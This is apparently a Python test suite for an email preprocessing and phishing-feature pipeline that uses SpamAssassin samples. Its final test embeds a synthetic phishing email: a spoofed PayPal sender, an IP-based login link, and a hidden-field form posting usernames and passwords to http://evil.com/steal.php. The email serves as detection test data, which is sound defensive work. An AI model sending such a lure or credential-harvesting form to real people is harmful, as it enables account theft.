"""
Tests for Email Preprocessing Pipeline

Tests parsing, URL extraction, and feature extraction using
real email samples from spamassassin_data.
"""

import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from preprocessing import (
    preprocess_email,
    parse_email,
    extract_urls,
    extract_features,
    EmailFeatures,
)


def load_sample_email(filename: str) -> str:
    """Load a sample email from spamassassin_data."""
    base_path = Path(__file__).parent.parent / "spamassassin_data" / "easy_ham"
    filepath = base_path / filename

    if not filepath.exists():
        raise FileNotFoundError(f"Sample email not found: {filepath}")

    with open(filepath, 'r', encoding='latin-1') as f:
        return f.read()


def test_email_parser_basic():
    """Test basic email parsing."""
    print("=" * 60)
    print("TEST: Basic Email Parsing")
    print("=" * 60)

    raw_email = load_sample_email("0001.ea7e79d3153e7469e7a9c3e0af6a357e")
    parsed = parse_email(raw_email)

    print(f"Subject: {parsed.subject}")
    print(f"From: {parsed.from_address}")
    print(f"To: {parsed.to_addresses}")
    print(f"Date: {parsed.date}")
    print(f"Message-ID: {parsed.message_id}")
    print(f"Content-Type: {parsed.content_type}")
    print(f"Is Multipart: {parsed.is_multipart}")
    print(f"Received Hops: {len(parsed.received_chain)}")
    print(f"Body Length: {len(parsed.body_text)} chars")
    print(f"Body Preview: {parsed.body_text[:200]}...")
    print(f"Parse Errors: {parsed.parse_errors}")

    assert parsed.subject, "Subject should not be empty"
    assert parsed.from_address, "From address should not be empty"
    assert parsed.body_text, "Body text should not be empty"
    print("\n✓ Basic parsing test passed!\n")


def test_email_parser_multiple():
    """Test parsing multiple different emails."""
    print("=" * 60)
    print("TEST: Multiple Email Parsing")
    print("=" * 60)

    samples = [
        "0001.ea7e79d3153e7469e7a9c3e0af6a357e",
        "0005.8c3b9e9c0f3f183ddaf7592a11b99957",
        "0010.4996141de3f21e858c22f88231a9f463",
    ]

    for sample in samples:
        try:
            raw_email = load_sample_email(sample)
            parsed = parse_email(raw_email)
            print(f"✓ {sample}: Subject='{parsed.subject[:40]}...' From={parsed.from_address[:30]}")
        except Exception as e:
            print(f"✗ {sample}: Error - {e}")

    print("\n✓ Multiple parsing test completed!\n")


def test_url_extraction():
    """Test URL extraction from text."""
    print("=" * 60)
    print("TEST: URL Extraction")
    print("=" * 60)

    # Test with plain text URLs
    test_text = """
    Check out these links:
    https://www.example.com/path/to/page
    http://suspicious-site.com/login?user=admin
    Visit www.google.com for more info.
    IP-based: http://192.168.1.1:8080/admin
    """

    urls = extract_urls(text=test_text)

    print(f"Found {len(urls)} URLs:")
    for url in urls:
        print(f"  - {url.raw_url}")
        print(f"    Domain: {url.domain}, TLD: {url.tld}, HTTPS: {url.uses_https}")
        print(f"    IP-based: {url.is_ip_address}, Path depth: {url.path_depth}")

    assert len(urls) >= 4, f"Expected at least 4 URLs, found {len(urls)}"
    print("\n✓ URL extraction test passed!\n")


def test_url_extraction_html():
    """Test URL extraction from HTML."""
    print("=" * 60)
    print("TEST: HTML URL Extraction")
    print("=" * 60)

    test_html = """
    <html>
    <body>
        <a href="https://legit-bank.com/account">Click here to verify</a>
        <a href="http://phishing-site.com/steal">https://legit-bank.com</a>
        <p>Contact us at <a href="mailto:support@example.com">email</a></p>
    </body>
    </html>
    """

    urls = extract_urls(html=test_html)

    print(f"Found {len(urls)} URLs:")
    for url in urls:
        print(f"  - {url.raw_url}")
        print(f"    Anchor text: '{url.anchor_text}'")

    # Check for anchor text extraction
    assert any(url.anchor_text for url in urls), "Should extract anchor text"
    print("\n✓ HTML URL extraction test passed!\n")


def test_feature_extraction():
    """Test feature extraction from real email."""
    print("=" * 60)
    print("TEST: Feature Extraction")
    print("=" * 60)

    raw_email = load_sample_email("0001.ea7e79d3153e7469e7a9c3e0af6a357e")
    parsed = parse_email(raw_email)
    features = extract_features(parsed)

    print("Extracted Features:")
    feature_dict = features.to_dict()
    for name, value in feature_dict.items():
        print(f"  {name}: {value}")

    # Validate feature vector
    feature_vector = features.to_list()
    feature_names = EmailFeatures.feature_names()

    assert len(feature_vector) == len(feature_names), "Feature vector length mismatch"
    assert len(feature_dict) == len(feature_names), "Feature dict length mismatch"

    print(f"\nTotal features: {len(feature_names)}")
    print("\n✓ Feature extraction test passed!\n")


def test_full_pipeline():
    """Test complete preprocessing pipeline."""
    print("=" * 60)
    print("TEST: Full Preprocessing Pipeline")
    print("=" * 60)

    raw_email = load_sample_email("0001.ea7e79d3153e7469e7a9c3e0af6a357e")
    result = preprocess_email(raw_email)

    print("Pipeline Result Keys:")
    for key in result.keys():
        value = result[key]
        if isinstance(value, str):
            print(f"  {key}: '{value[:50]}...' (str)")
        elif isinstance(value, (list, set)):
            print(f"  {key}: {len(value)} items ({type(value).__name__})")
        elif isinstance(value, dict):
            print(f"  {key}: {len(value)} entries (dict)")
        else:
            print(f"  {key}: {type(value).__name__}")

    # Validate required outputs
    assert 'subject' in result
    assert 'body_text' in result
    assert 'headers' in result
    assert 'urls' in result
    assert 'features' in result
    assert 'feature_vector' in result
    assert 'feature_names' in result

    print(f"\nFeature vector shape: {len(result['feature_vector'])} features")
    print(f"URLs found: {len(result['urls'])}")
    print(f"Unique domains: {len(result['unique_domains'])}")

    print("\n✓ Full pipeline test passed!\n")


def test_synthetic_phishing_email():
    """Test with a synthetic phishing-like email."""
    print("=" * 60)
    print("TEST: Synthetic Phishing Email Detection")
    print("=" * 60)

    phishing_email = """From: security@paypa1.com
To: victim@example.com
Reply-To: attacker@evil.com
Subject: URGENT: Your account has been suspended!
Date: Mon, 3 Feb 2026 10:00:00 -0500
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

<html>
<body>
<p>Dear Customer,</p>
<p>Your PayPal account has been <b>SUSPENDED</b> due to suspicious activity!</p>
<p>You must verify your identity immediately or your account will be permanently locked.</p>
<p><a href="http://192.168.1.100/paypal/login.php">Click here to verify your account NOW</a></p>
<p>Please enter your password and credit card details to restore access.</p>
<form action="http://evil.com/steal.php" method="post">
    <input type="hidden" name="target" value="paypal">
    <input type="text" name="username" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
</form>
<p style="display:none">This is hidden tracking text</p>
</body>
</html>
"""

    result = preprocess_email(phishing_email)
    features = result['features']

    print("Phishing Indicators Detected:")
    print(f"  Reply-To Mismatch: {features.has_reply_to_mismatch}")
    print(f"  Has IP URL: {features.has_ip_url}")
    print(f"  Has Form: {features.has_form}")
    print(f"  Has Hidden Text: {features.has_hidden_text}")
    print(f"  No HTTPS Ratio: {features.no_https_ratio}")
    print(f"  Urgent Keywords: {features.num_urgent_keywords}")
    print(f"  Credential Keywords: {features.num_credential_keywords}")
    print(f"  Action Keywords: {features.num_action_keywords}")
    print(f"  Subject Has Urgent: {features.subject_has_urgent}")

    # This synthetic email should trigger multiple indicators
    assert features.has_reply_to_mismatch == 1, "Should detect reply-to mismatch"
    assert features.has_form == 1, "Should detect form"
    assert features.num_urgent_keywords > 0, "Should detect urgent keywords"
    assert features.num_credential_keywords > 0, "Should detect credential keywords"

    print("\n✓ Synthetic phishing test passed!\n")


def run_all_tests():
    """Run all tests."""
    print("\n" + "=" * 60)
    print("RUNNING ALL PREPROCESSING TESTS")
    print("=" * 60 + "\n")

    try:
        test_email_parser_basic()
        test_email_parser_multiple()
        test_url_extraction()
        test_url_extraction_html()
        test_feature_extraction()
        test_full_pipeline()
        test_synthetic_phishing_email()

        print("=" * 60)
        print("ALL TESTS PASSED!")
        print("=" * 60)
        return True

    except AssertionError as e:
        print(f"\n✗ Test failed: {e}")
        return False
    except Exception as e:
        print(f"\n✗ Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return False


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
